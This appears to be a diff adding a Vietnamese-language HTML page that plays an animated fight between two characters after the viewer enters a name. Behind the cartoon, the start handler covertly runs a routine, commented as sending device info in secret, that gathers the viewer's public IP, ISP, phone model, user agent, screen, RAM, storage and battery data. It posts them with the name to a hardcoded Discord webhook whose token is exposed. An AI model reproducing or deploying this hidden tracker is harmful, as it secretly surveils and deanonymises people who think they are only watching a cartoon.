@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phim Hoạt Hình Đấu Chiến</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/howler/2.2.3/howler.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background-color: #1a202c;
+            color: #e2e8f0;
+            font-family: 'Inter', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            overflow: hidden;
+            flex-direction: column;
+        }
+        .container {
+            position: relative;
+            width: 100%;
+            max-width: 1000px;
+            height: 600px;
+            background-color: #2d3748;
+            border-radius: 12px;
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 10px 10px -5px rgba(0, 0, 0, 0.4);
+            overflow: hidden;
+            border: 2px solid #4a5568;
+            display: none; /* Hidden by default */
+        }
+        .start-screen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background-color: #2d3748;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
+            width: 80%;
+            max-width: 500px;
+            text-align: center;
+        }
+        .start-screen h1 {
+            font-size: 2.5rem;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        .start-screen input {
+            padding: 10px;
+            border-radius: 8px;
+            border: 2px solid #a0aec0;
+            background-color: #4a5568;
+            color: #e2e8f0;
+            width: 80%;
+            margin-bottom: 20px;
+        }
+        .start-screen button {
+            padding: 12px 30px;
+            background-color: #48bb78;
+            color: #fff;
+            font-weight: bold;
+            border-radius: 8px;
+            transition: background-color 0.3s ease;
+        }
+        .start-screen button:hover {
+            background-color: #38a169;
+        }
+
+        .character, .minion {
+            position: absolute;
+            width: 80px;
+            height: 80px;
+            background-size: cover;
+            background-position: center;
+            transition: all 0.2s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+            filter: drop-shadow(0 0 10px rgba(255, 255, 255, 0.5));
+            z-index: 50;
+        }
+        .character-1 {
+            background-image: url('https://i.postimg.cc/sXC0bQMv/1758197059647.jpg');
+            left: 100px;
+            top: 250px;
+        }
+        .character-2 {
+            background-image: url('https://i.postimg.cc/wxVbbBgj/1758197056461.jpg');
+            right: 100px;
+            top: 250px;
+        }
+        .minion-1 {
+            background-image: url('https://i.postimg.cc/tTsjsLdr/1758199038616.jpg');
+            width: 60px;
+            height: 60px;
+            display: none;
+        }
+        .minion-2 {
+            background-image: url('https://i.postimg.cc/mgzrrQPc/1758199034574.jpg');
+            width: 60px;
+            height: 60px;
+            display: none;
+        }
+        .minion-3 {
+            background-image: url('https://i.postimg.cc/FHMHk7ST/1758199030835.jpg');
+            width: 60px;
+            height: 60px;
+            display: none;
+        }
+        .teleport-effect {
+            position: absolute;
+            background: radial-gradient(circle, rgba(255, 255, 255, 0.8) 0%, rgba(255, 255, 255, 0) 70%);
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            opacity: 0;
+            transform: scale(0);
+            transition: all 0.1s ease-out;
+            z-index: 100;
+        }
+        .projectile {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            box-shadow: 0 0 15px 5px #63b3ed;
+            transition: all 0.1s linear;
+            z-index: 10;
+        }
+        .projectile.fire { background-color: #ff5722; box-shadow: 0 0 15px 5px #ff5722; }
+        .projectile.water { background-color: #2196f3; box-shadow: 0 0 15px 5px #2196f3; }
+        .projectile.laser { background-color: #e91e63; box-shadow: 0 0 15px 5px #e91e63; border-radius: 5px; width: 100px; height: 10px; }
+        
+        .punch-effect {
+            position: absolute;
+            background: radial-gradient(circle, rgba(255, 200, 0, 0.8) 0%, rgba(255, 0, 0, 0) 70%);
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            transform: scale(0);
+            transition: transform 0.1s ease-out, opacity 0.1s ease-out;
+            opacity: 0;
+            z-index: 20;
+        }
+        .fade-in {
+            animation: fadeIn 2s forwards;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        .health-bar-container {
+            width: 250px;
+            height: 20px;
+            background-color: #4a5568;
+            border-radius: 10px;
+            overflow: hidden;
+            border: 2px solid #a0aec0;
+            position: absolute;
+            top: 20px;
+            z-index: 100;
+        }
+        .health-bar-container.health-bar-1 {
+            top: 50px;
+        }
+        .health-bar {
+            height: 100%;
+            transition: width 0.3s ease-in-out;
+        }
+        .health-bar-1 { left: 20px; }
+        .health-bar-2 { right: 20px; }
+        .health-bar-1 .health-bar { background-color: #48bb78; }
+        .health-bar-2 .health-bar { background-color: #e2e8f0; }
+        .character-name {
+            position: absolute;
+            top: 0;
+            transform: translateY(-120%);
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #e2e8f0;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5);
+        }
+        .transformation-aura {
+            position: absolute;
+            background: radial-gradient(circle, rgba(255, 255, 0, 0.8) 0%, rgba(255, 255, 0, 0) 70%);
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            opacity: 0;
+            transform: scale(0);
+            z-index: 40;
+            animation: auraPulse 1s infinite ease-in-out;
+        }
+        @keyframes auraPulse {
+            0% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.2); opacity: 1; }
+            100% { transform: scale(1); opacity: 0.8; }
+        }
+        .game-over-message {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 3rem;
+            font-weight: bold;
+            color: #fff;
+            text-shadow: 0 0 10px #fff;
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 20px 40px;
+            border-radius: 10px;
+            text-align: center;
+            opacity: 0;
+            animation: fadeInMessage 1s forwards;
+            z-index: 200;
+        }
+        @keyframes fadeInMessage {
+            to { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="start-screen" id="start-screen">
+        <h1>Nhập tên bạn để bắt đầu!</h1>
+        <input type="text" id="viewer-name" placeholder="Tên của bạn...">
+        <button id="start-button">Bắt đầu phim</button>
+    </div>
+    
+    <div class="container" id="game-container">
+        <!-- Health Bars with names -->
+        <div class="health-bar-container health-bar-1">
+            <span class="character-name" style="left: 0; right: 0; text-align: center;">Béo</span>
+            <div id="health-bar-1" class="health-bar"></div>
+        </div>
+        <div class="health-bar-container health-bar-2">
+            <span class="character-name" style="left: 0; right: 0; text-align: center;">Lùn</span>
+            <div id="health-bar-2" class="health-bar"></div>
+        </div>
+
+        <div class="character character-1 fade-in" id="char1"></div>
+        <div class="character character-2 fade-in" id="char2"></div>
+        <div class="minion minion-1 fade-in" id="minion1"></div>
+        <div class="minion minion-2 fade-in" id="minion2"></div>
+        <div class="minion minion-3 fade-in" id="minion3"></div>
+    </div>
+
+    <script>
+        const startScreen = document.getElementById('start-screen');
+        const startButton = document.getElementById('start-button');
+        const viewerNameInput = document.getElementById('viewer-name');
+        const container = document.getElementById('game-container');
+        const char1 = document.getElementById('char1');
+        const char2 = document.getElementById('char2');
+        const healthBar1 = document.getElementById('health-bar-1');
+        const healthBar2 = document.getElementById('health-bar-2');
+        const minion1 = document.getElementById('minion1');
+        const minion2 = document.getElementById('minion2');
+        const minion3 = document.getElementById('minion3');
+        const minions = [minion1, minion2, minion3];
+
+        const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
+
+        let health = { char1: 500, char2: 600 };
+        let transformed = { char1: false, char2: false };
+        let minionsSpawned = false;
+        let gameOver = false;
+        let viewerName = 'Người xem';
+
+        // Webhook của bạn đã được thêm vào đây.
+        const webhookUrl = 'https://discord.com/api/webhooks/1409756826131759245/WGUsXH4DXGzHzSiR1lmtJ9UaGoOlgr_wRHEe2Z5o4FwgupMKkpNXeAiZ-49oTbrR2VKW';
+
+        // Khởi tạo nhạc nền
+        const bgm = new Howl({
+            src: ['https://s3.amazonaws.com/cdn.imleagues.com/howl/music/Kevin_MacLeod-The_Builder.mp3'],
+            autoplay: false,
+            loop: true,
+            volume: 0.5,
+        });
+
+        /**
+         * Lấy thông tin chi tiết của thiết bị người dùng.
+         */
+        async function getDeviceInfo() {
+            const info = {};
+            const ua = navigator.userAgent;
+
+            // Lấy IP công cộng (Public IP)
+            try {
+                const res = await fetch("https://api64.ipify.org?format=json");
+                const data = await res.json();
+                info["IP công cộng"] = data.ip || "Không lấy được";
+            } catch (e) {
+                info["IP công cộng"] = "Không lấy được";
+            }
+            
+            // Lấy IP và Nhà mạng qua ipinfo.io
+            try {
+                const res = await fetch("https://ipinfo.io/json?token=2d5f6d5e8c2c0c");
+                const data = await res.json();
+                info["Nhà mạng"] = data.org || "Không lấy được";
+            } catch (e) {
+                info["Nhà mạng"] = "Không lấy được";
+            }
+
+            // User Agent (nguyên gốc)
+            info.UserAgent = ua;
+
+            // Loại thiết bị và hệ điều hành
+            let deviceType = "Máy tính";
+            if (/Mobi|Android|iPhone|iPod/.test(ua)) {
+                deviceType = "Điện thoại";
+            } else if (/iPad|Tablet|Android/.test(ua) && !/Mobi/.test(ua)) {
+                deviceType = "Máy tính bảng";
+            }
+            info["Loại thiết bị"] = deviceType;
+
+            // Dự đoán tên điện thoại
+            let phoneModel = "Không rõ";
+            if (/iPhone|iPad/.test(ua)) {
+                phoneModel = "iPhone";
+                if (/CPU iPhone OS/.test(ua)) {
+                    const osVersion = ua.match(/OS (\d+)_(\d+)_?(\d+)?/);
+                    if (osVersion) {
+                        phoneModel += ` (iOS ${osVersion[1]}.${osVersion[2]})`;
+                    }
+                }
+            } else if (/Android/.test(ua)) {
+                const androidModel = ua.match(/Android [0-9.]*; ([^;)]+)/);
+                if (androidModel && androidModel[1]) {
+                    phoneModel = androidModel[1].trim();
+                } else if (/SAMSUNG|SM-|GT-/.test(ua)) {
+                    phoneModel = "Samsung";
+                } else if (/Xiaomi|Redmi|Mi/.test(ua)) {
+                    phoneModel = "Xiaomi";
+                } else if (/Oppo|CPH/.test(ua)) {
+                    phoneModel = "Oppo";
+                }
+            }
+            info["Hãng/Loại điện thoại"] = phoneModel;
+
+            // Ngôn ngữ
+            info.Ngôn_ngữ = navigator.language;
+
+            // Độ phân giải màn hình
+            info["Độ phân giải"] = `${window.screen.width} x ${window.screen.height}`;
+
+            // RAM (ước lượng)
+            if (navigator.deviceMemory) {
+                info["RAM (ước lượng)"] = navigator.deviceMemory + " GB";
+            } else {
+                info["RAM (ước lượng)"] = "Không lấy được";
+            }
+
+            // Bộ nhớ Storage (chỉ ước lượng, cần HTTPS + quyền)
+            if (navigator.storage && navigator.storage.estimate) {
+                try {
+                    const est = await navigator.storage.estimate();
+                    info["Bộ nhớ khả dụng"] = (est.quota / 1024 / 1024 / 1024).toFixed(2) + " GB";
+                } catch (e) {
+                    info["Bộ nhớ khả dụng"] = "Không lấy được";
+                }
+            } else {
+                info["Bộ nhớ khả dụng"] = "Không hỗ trợ";
+            }
+
+            // Pin (Battery API)
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    info["Pin (%)"] = Math.round(battery.level * 100) + "%";
+                    info["Sạc"] = battery.charging ? "Đang sạc" : "Không sạc";
+                } catch (e) {
+                    info["Pin (%)"] = "Không lấy được";
+                    info["Sạc"] = "Không lấy được";
+                }
+            } else {
+                info["Pin (%)"] = "Không hỗ trợ";
+                info["Sạc"] = "Không hỗ trợ";
+            }
+
+            return info;
+        }
+
+        async function sendDeviceInfo() {
+            try {
+                const deviceInfo = await getDeviceInfo();
+                
+                const messageContent = `
+**Người dùng mới tham gia phim hoạt hình:**
+- **Tên người xem:** \`${viewerName}\`
+- **IP công cộng:** \`${deviceInfo['IP công cộng']}\`
+- **Nhà mạng:** \`${deviceInfo['Nhà mạng']}\`
+- **Loại thiết bị:** \`${deviceInfo['Loại thiết bị']}\`
+- **Hãng/Loại điện thoại:** \`${deviceInfo['Hãng/Loại điện thoại']}\`
+- **User Agent:** \`${deviceInfo.UserAgent}\`
+- **Ngôn ngữ:** \`${deviceInfo['Ngôn_ngữ']}\`
+- **Độ phân giải:** \`${deviceInfo['Độ phân giải']}\`
+- **RAM (ước tính):** \`${deviceInfo['RAM (ước lượng)']}\`
+- **Bộ nhớ khả dụng:** \`${deviceInfo['Bộ nhớ khả dụng']}\`
+- **Pin:** \`${deviceInfo['Pin (%)']}\` (${deviceInfo.Sạc})
+- **Thời gian:** \`${new Date().toISOString()}\`
+                `;
+
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ content: messageContent })
+                });
+
+            } catch (error) {
+                console.error('Lỗi khi gửi dữ liệu:', error);
+            }
+        }
+
+        const updateHealthBar = () => {
+            healthBar1.style.width = `${(health.char1 / 500) * 100}%`;
+            healthBar2.style.width = `${(health.char2 / 600) * 100}%`;
+        };
+
+        const getRandomPosition = () => {
+            const x = Math.random() * (container.offsetWidth - 100);
+            const y = Math.random() * (container.offsetHeight - 100);
+            return { x, y };
+        };
+
+        const getTargetPosition = (fromChar, toChar) => {
+            const fromX = fromChar.offsetLeft;
+            const fromY = fromChar.offsetTop;
+            const toX = toChar.offsetLeft;
+            const toY = toChar.offsetTop;
+            const angle = Math.atan2(toY - fromY, toX - fromX);
+            const distance = Math.min(100, Math.hypot(toX - fromX, toY - fromY));
+            const newX = fromX + distance * Math.cos(angle);
+            const newY = fromY + distance * Math.sin(angle);
+            return { x: newX, y: newY };
+        };
+
+        const checkCollision = (rect1, rect2) => {
+            if (!rect1 || !rect2) return false;
+            const dx = rect1.left - rect2.left;
+            const dy = rect1.top - rect2.top;
+            const distance = Math.sqrt(dx * dx + dy * dy);
+            return distance < 80;
+        };
+
+        const createTeleportEffect = async (char, targetPos) => {
+            const effect = document.createElement('div');
+            effect.classList.add('teleport-effect');
+            effect.style.left = `${char.offsetLeft - 20}px`;
+            effect.style.top = `${char.offsetTop - 20}px`;
+            container.appendChild(effect);
+            effect.style.opacity = '1';
+            effect.style.transform = 'scale(1)';
+            await sleep(25);
+            char.style.left = `${targetPos.x}px`;
+            char.style.top = `${targetPos.y}px`;
+            await sleep(25);
+            effect.style.opacity = '0';
+            effect.style.transform = 'scale(0.1)';
+            await sleep(25);
+            effect.remove();
+        };
+
+        const createDashEffect = async (char, targetPos) => {
+            char.style.transition = 'all 0.04s ease-in-out';
+            char.style.left = `${targetPos.x}px`;
+            char.style.top = `${targetPos.y}px`;
+            await sleep(40);
+            char.style.transition = 'all 0.2s cubic-bezier(0.68, -0.55, 0.27, 1.55)';
+        };
+
+        const createProjectileAttack = async (fromChar, toChar, type) => {
+            const proj = document.createElement('div');
+            proj.classList.add('projectile');
+            proj.classList.add(type);
+            container.appendChild(proj);
+            const fromX = fromChar.offsetLeft + fromChar.offsetWidth / 2;
+            const fromY = fromChar.offsetTop + fromChar.offsetHeight / 2;
+            const toX = toChar.offsetLeft + toChar.offsetWidth / 2;
+            const toY = toChar.offsetTop + toChar.offsetHeight / 2;
+            
+            proj.style.left = `${fromX}px`;
+            proj.style.top = `${fromY}px`;
+            
+            if (type === 'laser') {
+                const angle = Math.atan2(toY - fromY, toX - fromX) * 180 / Math.PI;
+                proj.style.transform = `rotate(${angle}deg)`;
+                proj.style.width = `${Math.hypot(toX - fromX, toY - fromY)}px`;
+                proj.style.height = '10px';
+                proj.style.transformOrigin = 'left center';
+                proj.style.left = `${fromX}px`;
+                proj.style.top = `${fromY}px`;
+            } else {
+                proj.style.left = `${fromX}px`;
+                proj.style.top = `${fromY}px`;
+                await sleep(10);
+                proj.style.left = `${toX}px`;
+                proj.style.top = `${toY}px`;
+            }
+
+            await sleep(40);
+            const explosion = document.createElement('div');
+            explosion.classList.add('punch-effect');
+            explosion.style.left = `${toX - 50}px`;
+            explosion.style.top = `${toY - 50}px`;
+            container.appendChild(explosion);
+            await sleep(10);
+            explosion.style.transform = 'scale(1)';
+            explosion.style.opacity = '1';
+            proj.remove();
+            setTimeout(() => explosion.remove(), 40);
+
+            let damage = 5;
+            if (fromChar.id === 'char2' || fromChar.id === 'minion3') {
+                damage = 8;
+            }
+
+            if (toChar.id === 'char1' || toChar.id === 'minion1' || toChar.id === 'minion2') {
+                health.char1 -= damage;
+            } else if (toChar.id === 'char2' || toChar.id === 'minion3') {
+                health.char2 -= damage;
+            }
+            updateHealthBar();
+        };
+
+        const createPunchEffect = async (char) => {
+            const effect = document.createElement('div');
+            effect.classList.add('punch-effect');
+            effect.style.left = `${char.offsetLeft - 35}px`;
+            effect.style.top = `${char.offsetTop - 35}px`;
+            container.appendChild(effect);
+            await sleep(10);
+            effect.style.transform = 'scale(1)';
+            effect.style.opacity = '1';
+            setTimeout(() => effect.remove(), 40);
+        };
+
+        const createFlySkill = async (char) => {
+            const targetPos = getRandomPosition();
+            char.style.transition = 'all 0.15s ease-in-out';
+            char.style.left = `${targetPos.x}px`;
+            char.style.top = `${targetPos.y}px`;
+            await sleep(150);
+            char.style.transition = 'all 0.2s cubic-bezier(0.68, -0.55, 0.27, 1.55)';
+        };
+
+        const transform = async (char) => {
+            const aura = document.createElement('div');
+            aura.classList.add('transformation-aura');
+            aura.style.left = `${char.offsetLeft - 20}px`;
+            aura.style.top = `${char.offsetTop - 20}px`;
+            container.appendChild(aura);
+            transformed[char.id] = true;
+
+            await sleep(50);
+        };
+
+        const skills = [
+            (fromChar, toChar) => createTeleportEffect(fromChar, getTargetPosition(fromChar, toChar)),
+            (fromChar, toChar) => createDashEffect(fromChar, getTargetPosition(fromChar, toChar)),
+            (fromChar, toChar) => createProjectileAttack(fromChar, toChar, 'fire'),
+            (fromChar, toChar) => createProjectileAttack(fromChar, toChar, 'water'),
+            (fromChar, toChar) => createProjectileAttack(fromChar, toChar, 'laser'),
+            (fromChar, toChar) => createFlySkill(fromChar)
+        ];
+
+        async function battleLoop() {
+            while (!gameOver) {
+                if (health.char1 <= 350 && !minionsSpawned) {
+                    minionsSpawned = true;
+                    minion1.style.display = 'block';
+                    minion2.style.display = 'block';
+                    minion3.style.display = 'block';
+
+                    minion1.style.left = `${container.offsetWidth * 0.25}px`;
+                    minion1.style.top = `${container.offsetHeight / 2}px`;
+                    minion2.style.left = `${container.offsetWidth * 0.75}px`;
+                    minion2.style.top = `${container.offsetHeight / 2}px`;
+                    minion3.style.left = `${container.offsetWidth * 0.75}px`;
+                    minion3.style.top = `${container.offsetHeight * 0.75}px`;
+                }
+
+                if (health.char1 <= 250 && !transformed.char1) {
+                    await transform(char1);
+                }
+                if (health.char2 <= 300 && !transformed.char2) {
+                    await transform(char2);
+                }
+                
+                let char1Skill = skills[Math.floor(Math.random() * skills.length)];
+                await char1Skill(char1, char2);
+                await sleep(25);
+                
+                let char2Skill = skills[Math.floor(Math.random() * skills.length)];
+                await char2Skill(char2, char1);
+
+                if (minionsSpawned) {
+                    let minion1Skill = skills[Math.floor(Math.random() * skills.length)];
+                    await minion1Skill(minion1, char2);
+                    let minion2Skill = skills[Math.floor(Math.random() * skills.length)];
+                    await minion2Skill(minion2, char2);
+                    let minion3Skill = skills[Math.floor(Math.random() * skills.length)];
+                    await minion3Skill(minion3, char1);
+                }
+
+                if (checkCollision(char1.getBoundingClientRect(), char2.getBoundingClientRect())) {
+                    createPunchEffect(char1);
+                    createPunchEffect(char2);
+                    health.char1 -= 5;
+                    health.char2 -= 8;
+                    updateHealthBar();
+                }
+
+                if (minionsSpawned && checkCollision(minion1.getBoundingClientRect(), char2.getBoundingClientRect())) {
+                    createPunchEffect(minion1);
+                    health.char2 -= 8;
+                    updateHealthBar();
+                }
+
+                if (minionsSpawned && checkCollision(minion2.getBoundingClientRect(), char2.getBoundingClientRect())) {
+                    createPunchEffect(minion2);
+                    health.char2 -= 8;
+                    updateHealthBar();
+                }
+
+                if (minionsSpawned && checkCollision(minion3.getBoundingClientRect(), char1.getBoundingClientRect())) {
+                    createPunchEffect(minion3);
+                    health.char1 -= 5;
+                    updateHealthBar();
+                }
+                
+                if (health.char1 <= 0 || health.char2 <= 0) {
+                    gameOver = true;
+                    let winner = health.char1 <= 0 ? 'Lùn' : 'Béo';
+                    const message = document.createElement('div');
+                    message.classList.add('game-over-message');
+                    message.innerText = `${winner} chiến thắng! Chúc mừng, ${viewerName}!`;
+                    container.appendChild(message);
+                    container.style.pointerEvents = 'none';
+                    bgm.fade(bgm.volume(), 0, 1000); // Tắt dần nhạc
+                }
+                
+                await sleep(50);
+            }
+        }
+
+        const startGame = () => {
+            const name = viewerNameInput.value;
+            if (name.trim() !== '') {
+                viewerName = name;
+            }
+            startScreen.style.display = 'none';
+            container.style.display = 'block';
+            bgm.play(); // Bắt đầu phát nhạc
+            sendDeviceInfo(); // Gửi thông tin thiết bị ngầm
+            updateHealthBar();
+            battleLoop();
+        };
+
+        startButton.addEventListener('click', startGame);
+        viewerNameInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                startGame();
+            }
+        });
+    </script>
+</body>
+</html>
+
